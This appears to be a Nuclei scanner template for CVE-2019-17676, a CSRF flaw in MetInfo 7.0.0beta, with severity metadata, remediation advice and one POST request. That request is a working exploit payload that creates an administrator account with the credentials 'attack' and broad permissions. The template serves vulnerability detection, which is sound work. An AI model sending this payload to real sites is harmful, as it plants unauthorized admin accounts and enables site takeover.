id: CVE-2019-17676

info:
  name: CSRF in MetInfo 7.0.0beta
  author: ProjectDiscoveryAI
  severity: high
  description: app/system/admin/admin/index.class.php in MetInfo 7.0.0beta allows a CSRF attack to add a user account via a doSaveSetup action to admin/index.php.
  impact: |
    Allows attackers to perform unauthorized actions on behalf of authenticated users
  remediation: |
    Upgrade MetInfo to a version that is not affected by CVE-2019-17676
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2019-17676
    cwe-id: CWE-352
    epss-score: 0.00112
    epss-percentile: 0.46154
    cpe: cpe:2.3:a:metinfo:metinfo:7.0.0:beta:*:*:*:*:*:*
  metadata:
    vendor: metinfo
    product: metinfo

http:
  - method: POST
    path:
      - "{{BaseURL}}/mt7/admin/?n=admin&c=index&a=doSaveSetup"

    body: |
      admin_id=attack&admin_pass=attack&admin_pass_replay=attack&admin_name=&admin_mobile=&admin_email=&admin_group=3&id=&langok=metinfo-cn-en&admin_type=s1802-metinfo-s1301-c34-c76-c3-c4-c42-c72-c38-c44-c43-c73-c74-c2-c55-c47-c48-c70-c52-c71-c53-c46-s1201-s9999-s1202-s1509-s1510-s1511-s1106-s1404-s1406-s1405-s1905-s1505-s1800-s1801-s1904-a50002-a10070-s1506-s1601-s1603-s1200-s1004-s1005-s1002-s1100-s1007-s1003-s1604-s1605-s1508-s1901-s1902-s1903-s1104&admin_issueok=&admin_check=&admin_op=metinfo-add-editor-del&submit_type=save

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200
